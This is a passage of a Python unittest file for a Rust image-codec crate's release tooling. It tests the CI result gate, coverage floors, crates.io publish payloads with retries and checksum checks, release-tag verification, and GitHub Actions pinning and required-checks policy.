#!/usr/bin/env python3
"""Regression checks for coverage and GitHub Actions release policies."""

from __future__ import annotations

import contextlib
import copy
import errno
import gzip
import hashlib
import io
import json
import os
from pathlib import Path
import re
import subprocess
import ssl
import struct
import sys
import tarfile
import tempfile
import time
import unittest
import urllib.error
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent))
import verify_llvm_coverage as coverage
import check_workflows
import verify_ci_results
import prepare_crates_io_publish
import publish_release
import setup_benchmark_oracle
import verify_claim_ledger as claim_ledger
import verify_coverage_origins as coverage_origins
import verify_release_tag
import run_selected_coverage as selected_coverage


class RequiredCiResultGateTests(unittest.TestCase):
    def complete_results(self) -> dict[str, str]:
        return {
            job_id: "success"
            for job_id in verify_ci_results.RESULT_ENV_BY_JOB
        }

    def test_mandatory_jobs_require_success(self) -> None:
        results = self.complete_results()
        results["coverage"] = "skipped"
        self.assertEqual(verify_ci_results.check_ci_results("push", results), [])

        for job_id in results:
            if job_id == "coverage":
                continue
            for state in ("failure", "cancelled", "skipped", "missing"):
                with self.subTest(job=job_id, result=state):
                    changed = results.copy()
                    changed[job_id] = state
                    violations = verify_ci_results.check_ci_results("push", changed)
                    if job_id == "documentation" and state == "skipped":
                        self.assertEqual(violations, [])
                        continue
                    self.assertTrue(
                        any(f"concluded '{state}'" in item for item in violations),
                        violations,
                    )

    def test_documentation_is_required_for_pull_requests(self) -> None:
        for result in ("failure", "cancelled", "skipped", "missing"):
            with self.subTest(result=result):
                results = self.complete_results()
                results["documentation"] = result
                violations = verify_ci_results.check_ci_results(
                    "pull_request", results
                )
                self.assertTrue(
                    any(
                        "Documentation build and examples" in item
                        and f"concluded '{result}'" in item
                        for item in violations
                    ),
                    violations,
                )

    def test_coverage_is_required_only_for_full_coverage_events(self) -> None:
        results = self.complete_results()
        for event in ("push", "pull_request"):
            with self.subTest(event=event):
                results["coverage"] = "skipped"
                self.assertEqual(verify_ci_results.check_ci_results(event, results), [])

        for event in ("schedule", "workflow_dispatch"):
            with self.subTest(event=event):
                results["coverage"] = "skipped"
                violations = verify_ci_results.check_ci_results(event, results)
                self.assertTrue(any("Coverage report" in item for item in violations))
                results["coverage"] = "success"
                self.assertEqual(verify_ci_results.check_ci_results(event, results), [])

    def test_unknown_event_and_missing_job_results_fail_closed(self) -> None:
        results = self.complete_results()
        results.pop("quality")
        violations = verify_ci_results.check_ci_results("merge_group", results)
        self.assertTrue(any("unsupported GitHub event" in item for item in violations))
        self.assertTrue(
            any("Format, lint, and parity" in item and "missing" in item
                for item in violations),
            violations,
        )

    def test_workflow_environment_entrypoint_uses_the_result_mapping(self) -> None:
        environment = {"EVENT_NAME": "push"}
        environment.update(
            {
                variable: "success"
                for variable in verify_ci_results.RESULT_ENV_BY_JOB.values()
            }
        )
        environment["COVERAGE_RESULT"] = "skipped"
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(verify_ci_results.main(environment), 0)

            environment["QUALITY_RESULT"] = "failure"
            with contextlib.redirect_stderr(io.StringIO()):
                self.assertEqual(verify_ci_results.main(environment), 1)


class CoverageTests(unittest.TestCase):
    def setUp(self) -> None:
        self.totals = {
            metric: {"count": 100, "covered": floor, "percent": 100}
            for metric, floor in coverage.RELEASE_FLOORS.items()
        }

    def test_exact_floors_pass_and_any_metric_below_floor_fails(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(coverage.verify(self.totals), [])
            for metric in coverage.METRICS:
                totals = copy.deepcopy(self.totals)
                totals[metric]["covered"] -= 1
                failures = coverage.verify(totals)
                self.assertEqual(len(failures), 1)
                self.assertTrue(failures[0].startswith(metric))

    def test_strict_mode_still_requires_complete_coverage(self) -> None:
        with contextlib.redirect_stdout(io.StringIO()):
            self.assertEqual(len(coverage.verify(self.totals, strict=True)), 4)
            for value in self.totals.values():
                value["covered"] = value["count"]
            self.assertEqual(coverage.verify(self.totals, strict=True), [])

    def test_missing_empty_negative_or_noninteger_metrics_are_rejected(self) -> None:
        for bad in [None, {}, {"count": 0, "covered": 0},
                    {"count": -1, "covered": -1}, {"count": 100, "covered": -1},
                    {"count": 100, "covered": 101}, {"count": True, "covered": 1},
                    {"count": 100, "covered": 59.0}]:
            with self.subTest(value=bad):
                totals = copy.deepcopy(self.totals)
                totals["lines"] = bad
                with self.assertRaises(ValueError):
                    coverage.verify(totals)

    def test_multiple_or_missing_aggregates_are_not_accepted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            report = Path(directory) / "coverage.json"
            for document in [[], {}, {"data": []}, {"data": [None]},
                             {"data": [{"totals": self.totals}] * 2}]:
                report.write_text(json.dumps(document))
                with self.assertRaises(ValueError):
                    coverage.load_totals(report)
            report.write_text(json.dumps({"data": [{"totals": self.totals}]}))
            self.assertEqual(coverage.load_totals(report), self.totals)


class SelectedCoverageTests(unittest.TestCase):
    def setUp(self) -> None:
        self.directory = tempfile.TemporaryDirectory()
        self.addCleanup(self.directory.cleanup)
        self.matrix = Path(self.directory.name) / "coverage_matrix.json"
        self.matrix.write_text(
            json.dumps(
                {
                    "formats": {
                        "webp": {
                            "decode": [
                                {"id": "active", "format": "webp", "status": "active"},
                                {"id": "planned", "format": "webp", "status": "planned"},
                            ],
                            "encode": [],
                        }
                    },
                    "fault_contracts": [
                        {"id": "fault", "format": "bmp", "status": "active"}
                    ],
                }
            ),
            encoding="utf-8",
        )

    def test_case_list_rejects_malformed_and_duplicate_selectors(self) -> None:
        for value in (
            "decode:webp",
            "decode:webp:*",
            "decode:webp:a,decode:webp:b",
        ):
            with self.subTest(value=value), self.assertRaises(ValueError):
                selected_coverage.parse_case_list(value)
        with self.assertRaisesRegex(ValueError, "duplicate"):
            selected_coverage.parse_case_list("decode:webp:active decode:webp:active")

    def test_selection_rejects_unknown_and_planned_only_cases(self) -> None:
        with self.assertRaisesRegex(ValueError, "unknown selector"):
            selected_coverage.load_selected_rows(["decode:webp:missing"], self.matrix)
        with self.assertRaisesRegex(ValueError, "planned-only"):
            selected_coverage.load_selected_rows(["decode:webp:planned"], self.matrix)

    def test_fault_case_hashes_its_referenced_parity_input(self) -> None:
        rows = selected_coverage.load_selected_rows(
            ["fault-contract:bmp:bmp_palette_reservation_failure"]
        )
        hashes = selected_coverage.fixture_hashes(rows)
        self.assertEqual(
            hashes["tests/fixtures/input/images/bmp/rle4_odd_absolute_eol.bmp"]["status"],
            "present",
        )

    def test_fixture_hashes_include_nested_palette_and_explicit_asset_paths(self) -> None:
        rows = selected_coverage.load_selected_rows(
            ["decode:png:color_indexed_alpha"]
        )
        hashes = selected_coverage.fixture_hashes(rows)
        self.assertEqual(
            hashes["tests/fixtures/input/images/png/indexed_alpha.png"]["status"],
            "present",
        )
        self.assertEqual(
            hashes[
                "tests/fixtures/outputs/raws/Decode.png_indexed_alpha_png.decoded-palette.alpha.bin"
            ]["status"],
            "present",
        )

    def test_command_preserves_each_exact_selector_as_a_separate_argument(self) -> None:
        command = selected_coverage.build_command(
            "nightly-2026-07-16",
            Path("target/selected/coverage.json"),
            ["decode:webp:active", "fault-contract:bmp:fault"],
            "aarch64-apple-darwin",
        )
        self.assertEqual(
            command[:5],
            ["cargo", "+nightly-2026-07-16", "llvm-cov", "test", "--all-features"],
        )
        self.assertEqual(
            command[-4:],
            [
                "--skip",
                "__image_slash_star_matrix_row_selector__=decode:webp:active",
                "--skip",
                "__image_slash_star_matrix_row_selector__=fault-contract:bmp:fault",
            ],
        )
        self.assertEqual(
            command[5:7], ["--target", "aarch64-apple-darwin"]
        )

    def test_harness_output_must_prove_exact_selected_and_executed_sets(self) -> None:
        selected = selected_coverage.load_selected_rows(
            ["decode:webp:active", "decode:webp:planned"], self.matrix
        )
        output = (
            "matrix row selection: selected=2 active=1 planned-not-executed=1; "
            "canonical=decode:webp:active [active], "
            "decode:webp:planned [planned-not-executed]\n"
            "MATRIX_ROW_EXECUTING decode:webp:active\n"
            "MATRIX_ROW_PASSED decode:webp:active\n"
            "decode matrix (selected): 1/1 active rows passed, 0 failed, "
            "1 planned-not-executed\n"
        )
        result = selected_coverage.parse_harness_output(output, selected)
        self.assertEqual(
            result["counts"],
            {
                "selected": 2,
                "executed": 1,
                "passed": 1,
                "failed": 0,
                "planned_not_executed": 1,
            },
        )
        self.assertEqual(result["executed_case_ids"], ["decode:webp:active"])
        with self.assertRaisesRegex(ValueError, "did not execute"):
            selected_coverage.parse_harness_output(
                output.replace("MATRIX_ROW_EXECUTING decode:webp:active\n", "")
                .replace("MATRIX_ROW_PASSED decode:webp:active\n", "")
                .replace(
                    "decode matrix (selected): 1/1 active rows passed, 0 failed, ",
                    "decode matrix (selected): 0/1 active rows passed, 1 failed, ",
                ),
                selected,
            )

    def test_harness_accepts_rust_canonical_order_different_from_request_order(self) -> None:
        selected = selected_coverage.load_selected_rows(
            ["decode:webp:planned", "decode:webp:active"], self.matrix
        )
        output = (
            "matrix row selection: selected=2 active=1 planned-not-executed=1; "
            "canonical=decode:webp:active [active], "
            "decode:webp:planned [planned-not-executed]\n"
            "MATRIX_ROW_EXECUTING decode:webp:active\n"
            "MATRIX_ROW_PASSED decode:webp:active\n"
            "decode matrix (selected): 1/1 active rows passed, 0 failed, "
            "1 planned-not-executed\n"
        )
        result = selected_coverage.parse_harness_output(output, selected)
        self.assertEqual(
            result["selected_case_ids"],
            ["decode:webp:planned", "decode:webp:active"],
        )

    def test_coverage_totals_require_a_present_nonempty_valid_report(self) -> None:
        report = Path(self.directory.name) / "coverage.json"
        with self.assertRaisesRegex(ValueError, "missing or empty"):
            selected_coverage.report_totals(report)
        metrics = {
            name: {"covered": 1, "count": 2, "percent": 50.0}
            for name in ("lines", "branches", "functions", "regions")
        }
        report.write_text(json.dumps({"data": [{"totals": metrics}]}), encoding="utf-8")
        self.assertEqual(
            selected_coverage.report_totals(report)["branches"],
            {"covered": 1, "count": 2, "percent": 50.0},
        )
        metrics["branches"]["covered"] = 3
        report.write_text(json.dumps({"data": [{"totals": metrics}]}), encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "invalid branches totals"):
            selected_coverage.report_totals(report)

    def test_fault_contract_summary_remains_target_only(self) -> None:
        selected = selected_coverage.load_selected_rows(
            ["fault-contract:bmp:fault"], self.matrix
        )
        output = (
            "matrix row selection: selected=1 active=1 planned-not-executed=0; "
            "canonical=fault-contract:bmp:fault [active]\n"
            "MATRIX_ROW_EXECUTING fault-contract:bmp:fault\n"
            "MATRIX_ROW_PASSED fault-contract:bmp:fault\n"
            "Fault contracts: selected=1 executed=1 passed=1 failed=0 "
            "planned-not-executed=0 oracle=not_applicable\n"
        )
        result = selected_coverage.parse_harness_output(output, selected)
        self.assertEqual(
            result["operations"]["fault-contract"]["oracle"], "not_applicable"
        )


class CoverageOriginTests(unittest.TestCase):
    def test_guard_indexes_survive_source_line_insertions(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            library = root / "src" / "lib.rs"
            matrix = root / "tests" / "matrix.rs"
            inventory = root / "tests" / "fixtures" / "coverage_origin_manifest.json"
            library.parent.mkdir(parents=True)
            matrix.parent.mkdir(parents=True)
            inventory.parent.mkdir(parents=True)
            library.write_text("#[cfg(coverage)]\nfn allocation_guard() {}\n")
            matrix.write_text(
                "#[cfg(coverage)]\nfn first_fault_contract() {}\n"
                "#[cfg(coverage)]\nfn second_fault_contract() {}\n"
            )
            inventory.write_text(
                json.dumps(
                    {
                        "format_version": 2,
                        "entries": [
                            {
                                "path": "src/lib.rs",
                                "guard_count": 1,
                                "guards": [
                                    {"index": 1, "origin": "defensive_model"}
                                ],
                            },
                            {
                                "path": "tests/matrix.rs",
                                "guard_count": 2,
                                "guards": [
                                    {
                                        "index": 1,
                                        "origin": "independent_implementation",
                                    },
                                    {
                                        "index": 2,
                                        "origin": "independent_implementation",
                                    },
                                ],
                            },
                        ],
                    }
                )
            )

            with (
                patch.object(coverage_origins, "ROOT", root),
                patch.object(coverage_origins, "INVENTORY", inventory),
            ):
                self.assertEqual(coverage_origins.verify(), (3, 2))
                library.write_text("// unrelated header\n\n" + library.read_text())
                matrix.write_text("// inserted comment\n" + matrix.read_text())
                self.assertEqual(coverage_origins.verify(), (3, 2))

    def test_guard_count_still_rejects_unrecorded_source_guards(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            source = root / "src" / "lib.rs"
            inventory = root / "tests" / "fixtures" / "coverage_origin_manifest.json"
            source.parent.mkdir(parents=True)
            inventory.parent.mkdir(parents=True)
            source.write_text("#[cfg(coverage)]\nfn first() {}\n")
            inventory.write_text(
                json.dumps(
                    {
                        "format_version": 2,
                        "entries": [
                            {
                                "path": "src/lib.rs",
                                "guard_count": 1,
                                "guards": [
                                    {"index": 1, "origin": "defensive_model"}
                                ],
                            }
                        ],
                    }
                )
            )

            with (
                patch.object(coverage_origins, "ROOT", root),
                patch.object(coverage_origins, "INVENTORY", inventory),
            ):
                source.write_text(
                    source.read_text() + "\n#[cfg(coverage)]\nfn unlisted() {}\n"
                )
                with self.assertRaisesRegex(
                    RuntimeError, "guard_count 1 differs from source count 2"
                ):
                    coverage_origins.verify()


class PublishTests(unittest.TestCase):
    def test_registry_metadata_retries_transient_server_errors(self) -> None:
        version = "0.1.3"
        unavailable = urllib.error.HTTPError(
            f"{publish_release.API_ROOT}/image-slash-star/{version}",
            503,
            "service unavailable",
            {},
            io.BytesIO(),
        )
        checksum = hashlib.sha256(b"verified release archive").hexdigest()
        response = io.BytesIO(
            json.dumps({"version": {"num": version, "checksum": checksum}}).encode()
        )
        with (
            patch.object(
                publish_release.urllib.request,
                "urlopen",
                side_effect=[unavailable, response],
            ) as urlopen,
            patch.object(publish_release.time, "sleep") as sleep,
        ):
            metadata = publish_release.registry_version(version)

        self.assertEqual(metadata["checksum"], checksum)
        self.assertEqual(urlopen.call_count, 2)
        sleep.assert_called_once_with(1.0)

    def test_registry_metadata_retries_invalid_json_body(self) -> None:
        version = "0.1.3"
        checksum = hashlib.sha256(b"verified release archive").hexdigest()
        response = io.BytesIO(
            json.dumps({"version": {"num": version, "checksum": checksum}}).encode()
        )
        with (
            patch.object(
                publish_release.urllib.request,
                "urlopen",
                side_effect=[io.BytesIO(b'{"version":'), response],
            ) as urlopen,
            patch.object(publish_release.time, "sleep") as sleep,
        ):
            metadata = publish_release.registry_version(version)

        self.assertEqual(metadata["checksum"], checksum)
        self.assertEqual(urlopen.call_count, 2)
        sleep.assert_called_once_with(1.0)

    def test_registry_metadata_waits_for_primary_rate_limit_reset(self) -> None:
        version = "0.1.3"
        rate_limit = urllib.error.HTTPError(
            f"{publish_release.API_ROOT}/image-slash-star/{version}",
            403,
            "rate limited",
            {
                "X-RateLimit-Remaining": "0",
                "X-RateLimit-Reset": str(int(time.time()) + 10),
            },
            io.BytesIO(),
        )
        response = io.BytesIO(
            json.dumps({"version": {"num": version, "checksum": "0" * 64}}).encode()
        )
        with (
            patch.object(
                publish_release.urllib.request,
                "urlopen",
                side_effect=[rate_limit, response],
            ) as urlopen,
            patch.object(publish_release.time, "sleep") as sleep,
        ):
            self.assertIsNotNone(publish_release.registry_version(version))

        self.assertEqual(urlopen.call_count, 2)
        self.assertGreater(sleep.call_args.args[0], 0.0)
        self.assertLessEqual(sleep.call_args.args[0], 10.0)

    def test_registry_metadata_does_not_retry_rate_limit_without_reset(self) -> None:
        version = "0.1.3"
        rate_limit = urllib.error.HTTPError(
            f"{publish_release.API_ROOT}/image-slash-star/{version}",
            403,
            "rate limited",
            {"X-RateLimit-Remaining": "0"},
            io.BytesIO(),
        )
        with patch.object(
            publish_release.urllib.request, "urlopen", side_effect=rate_limit
        ) as urlopen:
            with self.assertRaisesRegex(publish_release.PublishError, "HTTP 403"):
                publish_release.registry_version(version)
        urlopen.assert_called_once()

    def test_registry_archive_retries_rate_limit_and_keeps_checksum_validation(self) -> None:
        version = "0.1.1"
        archive = gzip.compress(b"verified release archive", mtime=0)
        digest = hashlib.sha256(archive).hexdigest()
        rate_limit = urllib.error.HTTPError(
            f"{publish_release.API_ROOT}/image-slash-star/{version}/download",
            429,
            "rate limited",
            {"Retry-After": "4"},
            io.BytesIO(),
        )
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "release.crate"
            with (
                patch.object(
                    publish_release,
                    "registry_version",
                    return_value={"num": version, "checksum": digest},
                ),
                patch.object(
                    publish_release.urllib.request,
                    "urlopen",
                    side_effect=[rate_limit, io.BytesIO(archive)],
                ) as urlopen,
                patch.object(publish_release.time, "sleep") as sleep,
            ):
                self.assertEqual(
                    publish_release.download_registry_archive(version, destination),
                    digest,
                )

            self.assertEqual(destination.read_bytes(), archive)
        self.assertEqual(urlopen.call_count, 2)
        sleep.assert_called_once_with(4.0)

    def test_download_negotiates_archive_bytes_instead_of_the_json_url(self) -> None:
        version = "0.1.1"
        archive = gzip.compress(b"verified release archive", mtime=0)
        digest = hashlib.sha256(archive).hexdigest()
        metadata_url = f"{publish_release.API_ROOT}/image-slash-star/{version}"
        download_url = metadata_url + "/download"

        def serve(request, **kwargs):
            if request.full_url == metadata_url:
                self.assertEqual(request.get_header("Accept"), "application/json")
                return io.BytesIO(json.dumps({"version": {
                    "num": version, "checksum": digest,
                }}).encode())
            self.assertEqual(request.full_url, download_url)
            # The real crates.io endpoint returns a URL descriptor for JSON
            # clients, and redirects binary clients to the immutable archive.
            if request.get_header("Accept") == "application/json":
                return io.BytesIO(json.dumps({"url": "https://example.invalid/archive.crate"}).encode())
            self.assertEqual(request.get_header("Accept"), "application/octet-stream")
            return io.BytesIO(archive)

        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "release.crate"
            with patch.object(publish_release.urllib.request, "urlopen", side_effect=serve):
                self.assertEqual(publish_release.download_registry_archive(version, destination), digest)
            self.assertEqual(destination.read_bytes(), archive)

    def test_publish_request_uses_cargo_registry_length_prefixes(self) -> None:
        metadata = {
            "name": "image-slash-star",
            "vers": "0.1.3",
            "deps": [],
            "features": {"default": []},
        }
        archive = b"verified-crate-bytes"

        request = prepare_crates_io_publish.encode_publish_request(metadata, archive)
        metadata_size = struct.unpack_from("<I", request)[0]
        metadata_start = 4
        archive_size_offset = metadata_start + metadata_size
        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]

        self.assertEqual(
            json.loads(request[metadata_start:archive_size_offset]), metadata
        )
        self.assertEqual(archive_size, len(archive))
        self.assertEqual(request[archive_size_offset + 4 :], archive)

    def test_prepare_writes_the_exact_candidate_into_the_publish_request(self) -> None:
        package = {
            "name": "image-slash-star",
            "version": "0.1.3",
            "dependencies": [],
            "features": {"default": []},
        }
        archive = b"immutable candidate archive"
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = root / "image-slash-star-0.1.3.crate"
            candidate.write_bytes(archive)
            output = root / "nested" / "publish.bin"

            prepare_crates_io_publish.prepare(candidate, output, package)

            request = output.read_bytes()
        metadata_size = struct.unpack_from("<I", request)[0]
        archive_size_offset = 4 + metadata_size
        metadata = json.loads(request[4:archive_size_offset])
        archive_size = struct.unpack_from("<I", request, archive_size_offset)[0]
        self.assertEqual(metadata["name"], "image-slash-star")
        self.assertEqual(metadata["vers"], "0.1.3")
        self.assertEqual(archive_size, len(archive))
        self.assertEqual(request[archive_size_offset + 4 :], archive)

    def test_registry_metadata_rejects_a_readme_outside_the_package(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            package = {
                "name": "image-slash-star",
                "dependencies": [],
                "readme": "../README.md",
            }

            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "readme resolves outside the package",
            ):
                prepare_crates_io_publish.registry_metadata(
                    package, package_root=Path(directory)
                )

    def test_registry_metadata_rejects_unknown_dependency_kinds(self) -> None:
        package = {
            "name": "image-slash-star",
            "dependencies": [{"name": "odd", "kind": "runtime", "req": "*"}],
        }

        with self.assertRaisesRegex(
            prepare_crates_io_publish.PublishPayloadError,
            "unsupported dependency kind",
        ):
            prepare_crates_io_publish.registry_metadata(package)

    def test_publish_request_rejects_fields_larger_than_registry_limit(self) -> None:
        with patch.object(prepare_crates_io_publish, "MAX_U32", 2):
            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "publish request fields exceed the registry limit",
            ):
                prepare_crates_io_publish.encode_publish_request({}, b"123")

    def test_registry_metadata_maps_cargo_dependencies_and_readme(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / "README.md").write_text("Release metadata\n", encoding="utf-8")
            package = {
                "name": "image-slash-star",
                "version": "0.1.3",
                "dependencies": [
                    {
                        "name": "wide",
                        "req": "^1.6.1",
                        "kind": None,
                        "rename": "simd",
                        "optional": True,
                        "uses_default_features": False,
                        "features": ["std"],
                        "target": "cfg(target_arch = \"x86_64\")",
                        "registry": None,
                    }
                ],
                "features": {"default": ["simd"]},
                "authors": ["Appunni M"],
                "description": "Codec library",
                "readme": "README.md",
                "keywords": ["image"],
                "categories": ["multimedia::images"],
                "license": "MIT OR Apache-2.0",
                "repository": "https://example.invalid/repo",
                "rust_version": "1.96.1",
            }

            metadata = prepare_crates_io_publish.registry_metadata(
                package, package_root=root
            )

        self.assertEqual(metadata["readme"], "Release metadata\n")
        self.assertEqual(metadata["readme_file"], "README.md")
        self.assertEqual(
            metadata["deps"],
            [
                {
                    "name": "wide",
                    "version_req": "^1.6.1",
                    "features": ["std"],
                    "optional": True,
                    "default_features": False,
                    "target": "cfg(target_arch = \"x86_64\")",
                    "kind": "normal",
                    "registry": None,
                    "explicit_name_in_toml": "simd",
                }
            ],
        )

    def test_repository_cargo_metadata_forms_a_registry_publish_document(self) -> None:
        metadata = prepare_crates_io_publish.registry_metadata(
            prepare_crates_io_publish.cargo_metadata()
        )

        self.assertEqual(metadata["name"], "image-slash-star")
        self.assertEqual(metadata["vers"], publish_release.package_version())
        self.assertEqual(metadata["readme_file"], "README.md")
        self.assertTrue(metadata["readme"].startswith("# image-slash-star"))
        self.assertEqual(
            {dependency["kind"] for dependency in metadata["deps"]}, {"normal"}
        )

    def test_registry_visibility_wait_retries_without_publishing(self) -> None:
        with (
            patch.object(
                publish_release,
                "registry_version",
                side_effect=[None, {"num": "0.1.3"}],
            ),
            patch.object(publish_release.time, "sleep") as sleep,
        ):
            publish_release.wait_until_visible("0.1.3")

        sleep.assert_called_once_with(5)

    def test_prepare_rejects_a_candidate_for_another_version(self) -> None:
        package = {"name": "image-slash-star", "version": "0.1.3"}
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = root / "image-slash-star-0.1.2.crate"
            candidate.write_bytes(b"archive")

            with self.assertRaisesRegex(
                prepare_crates_io_publish.PublishPayloadError,
                "expected verified candidate named",
            ):
                prepare_crates_io_publish.prepare(
                    candidate, root / "publish.bin", package
                )

    def test_download_checksum_mismatch_still_blocks_release(self) -> None:
        metadata = {"num": "0.1.1", "checksum": hashlib.sha256(b"expected archive").hexdigest()}
        with tempfile.TemporaryDirectory() as directory:
            destination = Path(directory) / "release.crate"
            with (
                patch.object(publish_release, "registry_version", return_value=metadata),
                patch.object(publish_release.urllib.request, "urlopen", return_value=io.BytesIO(b"changed archive")),
            ):
                with self.assertRaisesRegex(publish_release.PublishError, "differs from crates.io index"):
                    publish_release.download_registry_archive("0.1.1", destination)

class ReleaseTagTests(unittest.TestCase):
    def test_remote_annotated_tag_must_peel_to_the_event_commit(self) -> None:
        tag_object = "b" * 40
        commit = "a" * 40
        output = (
            f"{tag_object}\trefs/tags/v0.1.1\n"
            f"{commit}\trefs/tags/v0.1.1^{{}}\n"
        )

        def capture_command(command: list[str]) -> str:
            if command[1] == "check-ref-format":
                return ""
            return output

        self.assertEqual(
            verify_release_tag.verify_remote_tag(
                "v0.1.1", commit, capture_command=capture_command
            ),
            commit,
        )
        with self.assertRaisesRegex(verify_release_tag.ReleaseTagError, "resolves to"):
            verify_release_tag.verify_remote_tag(
                "v0.1.1", "c" * 40, capture_command=capture_command
            )

    def test_remote_lightweight_tag_is_rejected(self) -> None:
        commit = "a" * 40

        def capture_command(command: list[str]) -> str:
            if command[1] == "check-ref-format":
                return ""
            return f"{commit}\trefs/tags/v0.1.1\n"

        with self.assertRaisesRegex(verify_release_tag.ReleaseTagError, "annotated"):
            verify_release_tag.verify_remote_tag(
                "v0.1.1", commit, capture_command=capture_command
            )


class WorkflowPolicyTests(unittest.TestCase):
    VALID_RELEASE_WORKFLOW = """env:
  COVERAGE_TOOLCHAIN: "nightly-2026-07-16"
jobs:
  release-coverage:
    steps:
      - uses: actions/checkout@123
      - uses: dtolnay/rust-toolchain@123
        with:
          toolchain: ${{ env.COVERAGE_TOOLCHAIN }}
      - run: cargo +${COVERAGE_TOOLCHAIN} install cargo-llvm-cov --locked --version 0.8.7
      - name: Measure coverage
        run: make coverage
  publish:
    needs: [preflight, release-coverage]
"""

    def test_external_actions_require_full_commit_shas(self) -> None:
        sha = "a" * 40
        contents = f"""jobs:
  build:
    steps:
      - uses: actions/checkout@v4
      - uses: "owner/action@{sha}" # pinned
      - uses: ./local/action
  reusable:
    uses: owner/repo/.github/workflows/ci.yml@v1
"""
        self.assertEqual(
            check_workflows.unpinned_action_uses(contents),
            [
                (4, "actions/checkout@v4"),
                (8, "owner/repo/.github/workflows/ci.yml@v1"),
            ],
        )

    def test_inline_flow_steps_cannot_bypass_action_pinning(self) -> None:
        contents = (
            "jobs:\n  build:\n    steps:\n"
            "      - {run: echo ok, uses: actions/checkout@v4}\n"
            "      - {\"uses\": owner/action@v1, run: echo ok}\n"
        )
        self.assertEqual(
            check_workflows.unpinned_action_uses(contents),
            [(4, "actions/checkout@v4"), (5, "owner/action@v1")],
        )

    def test_ci_manual_dispatches_use_unique_concurrency_groups(self) -> None:
        workflow = (Path(__file__).resolve().parent.parent
                    / ".github" / "workflows" / "ci.yml")
        group = next(
            line.strip()
            for line in workflow.read_text(encoding="utf-8").splitlines()
            if line.lstrip().startswith("group:")
        )
        self.assertIn(
            "github.event_name == 'workflow_dispatch' && github.run_id",
            group,
        )

    def test_required_ci_status_covers_every_applicable_job(self) -> None:
        workflow_path = (
            Path(__file__).resolve().parent.parent
            / ".github"
            / "workflows"
            / "ci.yml"
        )
        workflow = workflow_path.read_text(encoding="utf-8")
        self.assertEqual(check_workflows.ci_required_checks_violations(workflow), [])

        jobs = check_workflows.workflow_jobs(workflow)
        self.assertIsNotNone(jobs)
        required_job = jobs["required-checks"]
        needs_match = re.search(
            r"(?m)^    needs:\s*\n(?:^      - [A-Za-z0-9_-]+\s*\n)+",
            required_job,
        )
        self.assertIsNotNone(needs_match)
        needs_block = needs_match.group(0)
        needs_without_quality = re.sub(
            r"(?m)^      - quality\s*\n", "", needs_block, count=1
        )
        self.assertNotEqual(needs_block, needs_without_quality)
        required_job_start = (
            "  required-checks:\n"
            "    name: Required CI checks\n"
            "    # Preserve failure aggregation, but let superseded runs release concurrency.\n"
            "    if: always() && !cancelled()"
        )

        mutations = (
            (
                needs_block,
                needs_without_quality,
                "missing=['quality']",
            ),
            (
                "          QUALITY_RESULT: ${{ needs.quality.result }}",
                "          QUALITY_RESULT: ${{ needs.fixture-integrity.result }}",
                "CI required-checks must map QUALITY_RESULT from needs.quality.result",
            ),
            (
                "        run: python3 scripts/verify_ci_results.py",
                "        run: python3 scripts/verify_ci_results.py && exit 0",
                "CI required-checks must invoke the tested result gate directly",
            ),
            (
                required_job_start,
                "  unclassified-job:\n    runs-on: ubuntu-24.04\n\n"
                f"{required_job_start}",
                "CI workflow jobs are not classified by required-checks",
            ),
            (
                "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
                "        with:\n          persist-credentials: false\n"
                "      - name: Require every applicable CI job to pass\n",
                "      - name: Require every applicable CI job to pass\n",
                "CI required-checks must check out the script before running it",
            ),
            (
                required_job_start,
                required_job_start.replace(
                    "always() && !cancelled()", "always()", 1
                ),
                "CI required-checks job must run with if: "
                "always() && !cancelled()",
            ),
            (
                required_job_start,
                required_job_start.replace(
                    "always() && !cancelled()", "success()", 1
                ),
                "CI required-checks job must run with if: "
                "always() && !cancelled()",
            ),
            (
                "  quality:\n    name: Format, lint, and parity\n    needs: fixture-integrity\n",
                "  quality:\n    name: Format, lint, and parity\n    needs: fixture-integrity\n"
                "    continue-on-error: true\n",
                "CI required job quality and steps must not allow errors",
            ),
            (
                "      - name: Confirm Apple silicon runner\n"
                "        run: test \"$(uname -m)\" = arm64\n",
                "      - name: Confirm Apple silicon runner\n"
                "        continue-on-error: true\n"
                "        run: test \"$(uname -m)\" = arm64\n",
                "CI required job quality and steps must not allow errors",
            ),
            (
                "      - name: Require every applicable CI job to pass\n",
                "      - name: Require every applicable CI job to pass\n"
                "        if: false\n",
                "CI required-checks result-gate step must not be conditional",
            ),
            (
                "      - name: Require every applicable CI job to pass\n",
                "      - name: Require every applicable CI job to pass\n"
                "        continue-on-error: true\n",
                "CI required-checks result-gate step must not allow errors",
            ),
            (
                "    if: github.event_name == 'pull_request'\n",
                "    if: github.event_name == 'push'\n",
                "CI documentation job must run only for pull_request events",
            ),
            (
                "      - name: Execute examples using published packages\n"
                "        run: make docs-registry-examples PYTHON=python\n",
                "      - name: Execute examples using published packages\n"
                "        run: echo documentation examples skipped\n",
                "CI documentation job must execute exactly once: "
                "make docs-registry-examples PYTHON=python",
            ),
            (
                "      - name: Execute the documented Rust quickstart\n"
                "        run: make docs-examples\n",
                "      - name: Execute the documented Rust quickstart\n"
                "        if: false\n"
                "        run: make docs-examples\n",
                "CI documentation job must not conditionally skip: "
                "make docs-examples",
            ),
            (
                "      - name: Execute the documented Rust quickstart\n"
                "        run: make docs-examples\n",
                "      - name: Execute the documented Rust quickstart\n"
                "        continue-on-error: true\n"
                "        run: make docs-examples\n",
